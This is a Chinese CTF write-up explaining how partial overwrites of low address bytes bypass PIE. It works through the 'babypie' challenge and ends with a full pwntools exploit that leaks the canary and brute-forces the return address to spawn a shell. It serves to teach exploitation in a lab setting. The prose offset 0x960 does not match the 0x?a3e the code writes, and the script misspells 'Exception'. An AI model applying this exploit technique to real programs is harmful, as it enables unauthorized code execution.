> 参考资料：[https://eqqie.cn/index.php/laji_note/1017/](https://eqqie.cn/index.php/laji_note/1017/)
>
> CTF-wiki
>

# PIE特征
<font style="color:rgba(0, 0, 0, 0.87);">我们知道， 在程序开启了 PIE 保护时 (PIE enabled) 高位的地址会发生随机化， </font>**<font style="color:#F5222D;">但低位的偏移是始终固定的， 也就是说如果我们能更改低位的偏移， 就可以在一定程度上控制程序的执行流</font>**<font style="color:rgba(0, 0, 0, 0.87);">，绕过 PIE 保护。</font>

> partial overwrite不仅仅可以用在栈上，同样可以用在其它随机化的场景。比如堆的随机化，由于堆起始地址低字节一定是0x00，也可以通过覆盖低位来控制堆上的偏移。
>

# 示例
<font style="color:rgba(0, 0, 0, 0.87);">我们以CTF-wiki上的例题（</font><font style="color:rgba(0, 0, 0, 0.87);">安恒杯 2018 年 7 月月赛的 babypie </font><font style="color:rgba(0, 0, 0, 0.87);">）为例进行讲解：</font>

> [https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/stackoverflow/partial_overwrite/babypie](https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/stackoverflow/partial_overwrite/babypie)
>

首先检查一下文件的保护情况：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598926840052-c1f563d5-3b42-48f4-9de9-214765dcd812.png)

可以看到保护全开，并且开启了PIE保护，是64位程序

先来运行一下程序：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598927695298-292b6976-8ac4-4229-b3c0-2c4c544c98d0.png)

可以看到，程序给了我们两次输入的机会。

拖入IDA中，查看伪代码：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598927402655-95484fe8-b0be-4d53-9749-3bbb7f6ce4fa.png)

IDA 中看一下， 很容易就能发现漏洞点， 两处输入都有很明显的栈溢出漏洞。

同时发现system("/bin/sh")：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598927457227-33ac6f04-a1b4-49cb-bf83-2d6af788e68e.png)

由于开启了PIE保护，但是地址的低位是不会发生变化的。我们记下system函数的低位为0x960。<font style="color:#314659;">所以我们可以仅修改末尾的4位(因为每个字符相当于占两位 无法只修改三位)，这样就有一定的概率return到我们想要的system函数地址。</font>

溢出发生了两次，每次溢出可控制的字节不同。**<font style="color:#F5222D;">同时read不设置截断符\x00，而Canary为了防止被泄露，最低位字节固定为0x00，那么可以额外读取一个字节覆盖canary的最低字节，达到泄露目的。</font>**

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598951683470-b9dbfa16-531a-4f04-8d30-e145931ebb95.png)

大致利用思路已经很明了了：

第一次溢出用sendline把canary最后一个字节覆盖为换行符\x0a，然后从输出中读到canary+0xa，减去0xa得到canary。

第二次溢出运用上一步的canary覆盖canary所在的栈上位置并继续向后溢出，覆盖return地址低两位字节。

由于return地址低两位字节中有4 bits是无法控制的，也就是是随机的，好在范围不大，随便填一个靠点运气就能getshell。（也就是覆盖返回地址为0x?a3e，概率碰撞）



exp如下：

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
context.log_level = "debug"

while True:
    try:
        p = process("./babypie", timeout = 1)

        #  gdb.attach(p)
        p.sendafter(":\n", 'a' * (0x30 - 0x8 + 1))
        p.recvuntil('a' * (0x30 - 0x8 + 1))
        canary = '\0' + p.recvn(7)
        print canary.encode('hex')

        #  gdb.attach(p)
        p.sendafter(":\n", 'a' * (0x30 - 0x8) + canary + 'bbbbbbbb' + '\x3E\x0A')
	    #str+canary+ebp+ret

        p.interactive()
    except Exceptpn as e:
        p.close()
        print e
```

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1598952603695-62be8f5d-19e3-436c-be13-88addd017cde.png)

getshell

